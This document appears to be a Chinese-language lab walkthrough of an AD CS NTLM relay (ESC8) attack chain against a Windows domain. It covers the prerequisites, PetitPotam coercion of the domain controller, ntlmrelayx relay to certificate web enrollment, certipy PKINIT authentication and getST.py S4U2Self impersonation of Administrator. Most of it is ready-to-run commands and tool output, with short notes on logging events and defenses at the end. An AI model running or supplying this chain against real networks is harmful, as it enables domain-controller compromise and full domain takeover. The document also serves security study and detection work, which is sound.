🔑 前提條件 PREREQUISITE
• 攻擊者持有低權限域帳號（用於觸發 PetitPotam，非 Domain Admin）
• DC 與 CA 必須在不同主機，否則 Windows 阻擋 Self-Relay
• AD CS 啟用 Web Enrollment，IIS 未啟用 EPA
DC: 10.0.0.206 ≠ CA: 10.0.1.132 ← 必須分離

🎣 啟動 ntlmrelayx 監聽（先執行） STEP 3
在攻擊機啟動 ntlmrelayx，監聽 SMB Port 445，
準備將收到的 NTLM 認證同步轉發至 AD CS HTTP Endpoint（10.0.1.132）。
# 視窗1：先啟動，保持開啟 ntlmrelayx.py \ -t http://10.0.1.132/certsrv/certfnsh.asp \ -smb2support --adcs \ --template DomainController
等待連線...
監聽中 Port 445
2
📡 PetitPotam：強制 DC 發起 NTLM 認證 STEP 4
用低權限帳號呼叫 DC 的 EFS RPC (MS-EFSRPC)，
強制 DC 以 DC$ 機器帳號向攻擊機 Port 445 發起 NTLM 認證。
DC 使用 LSASS 隱式機器帳號 Token，不是明確指定憑證。
# 視窗2：觸發 python3 PetitPotam.py \ -d sme.local -u aduser -p <PASS> \ <KALI_IP> 10.0.0.206
DC (10.0.0.206) ──隱式 NTLM──▶ 攻擊機:445

✓ 4624 Network Logon (LogonType=3) ✗ 4648 不產生（隱式認證）

🔀 ntlmrelayx 同步轉發 → AD CS 核發憑證 STEP 4→5
ntlmrelayx 作為 MITM 同步橋接，以 DC$ 身分向 CA 發起 HTTP 認證。
此處是明確指定 DC$ 憑證的連線，符合 4648 觸發條件。
AD CS 誤以為是 DC$ 申請憑證，核發後 ntlmrelayx 自動儲存為 .pfx。
# ntlmrelayx 自動輸出（實測結果） [*] Authenticating against http://10.0.1.132 as SME/SME-SWP-W-AD$ SUCCEED [*] GOT CERTIFICATE! ID 2 [*] Writing PKCS#12 certificate to ./SME-SWP-W-AD$.pfx
ntlmrelayx (MITM) ──明確以 DC$ 連線──▶ CA (10.0.1.132) ──▶ SME-SWP-W-AD$.pfx

🎫 certipy auth：PKINIT 取得 DC$ TGT STEP 6
使用 DC$ 憑證透過 PKINIT（憑證式 Kerberos）申請 TGT。
同時透過 U2U 機制取得 DC$ 的 NT Hash。
正確工具：certipy auth（getTGT.py 不支援 PKINIT，已修正）。
certipy auth \ -pfx SME-SWP-W-AD\$.pfx \ -username "SME-SWP-W-AD$" \ -domain sme.local \ -dc-ip 10.0.0.206 export KRB5CCNAME=SME-SWP-W-AD\$.ccache

🎭 getST.py S4U2Self：模擬 Administrator STEP 7
DC$ 具有 TrustedToAuthForDelegation 屬性，
可透過 S4U2Self 代替任意帳號（Administrator）申請 Service Ticket。
getST.py \ -k -no-pass \ -spn "cifs/SME-SWP-W-AD.sme.local" \ -impersonate Administrator \ -dc-ip 10.0.0.206 \ "sme.local/SME-SWP-W-AD$" export KRB5CCNAME=Administrator.ccache

⚡ v4 修正摘要（實測驗證）：
• DC 端：PetitPotam → 4624（隱式機器帳號，非 4648）
• CA 端：ntlmrelayx 轉發 → 4648（明確以 DC$ 身分連線，新增）
• ntlmrelayx 自動輸出 .pfx，無需手動轉換
• PKINIT 工具：certipy auth（非 getTGT.py）
• Self-Relay 防護：DC 與 CA 必須分離（10.0.0.206 ≠ 10.0.1.132）
🛡 關鍵防禦措施：
• 啟用 SMB Signing（防止 SMB Relay）
• AD CS 啟用 EPA（Extended Protection for Authentication）（防止 HTTP Relay）
• 啟用 LDAP Signing + Channel Binding
• 封鎖非必要主機對 DC 的 EFS RPC（MS-EFSRPC）呼叫
